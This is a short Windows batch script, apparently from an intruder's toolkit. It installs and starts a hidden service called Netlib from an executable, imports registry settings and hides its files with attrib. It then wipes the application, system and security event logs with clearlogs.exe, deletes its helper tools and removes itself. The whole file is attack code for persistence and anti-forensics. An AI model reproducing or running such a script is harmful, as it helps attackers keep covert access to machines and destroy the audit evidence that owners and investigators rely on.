@echo off
Netlib.exe /s
pskill.exe Netlib
service stop Netlib
service delete Netlib
goto installing

:installing
copy Netlib.exe %windir%\system32\Netlib.exe
instsrv Netlib %SystemRoot%\System32\Netlib.exe
regini Netlib.ini
regedit /s netlib.reg
del netlib.reg
del %windir%\system32\Netlib.exe
attrib Netlib.exe +h
attrib msdxm32.ocx +h
net start Netlib
goto clearing

:clearing
clearlogs.exe -app
clearlogs.exe -sys
clearlogs.exe -sec
del clearlogs.exe,fport.exe,info.exe,instsrv.exe,Netlib.ini,pskill.exe,regini.exe,service.exe
attrib %systemroot%\system32\di.exe +r
attrib %systemroot%\system32\di.exe +w
attrib %systemroot%\system32\di.exe +rw
del %systemroot%\system32\di.exe
del start.cmd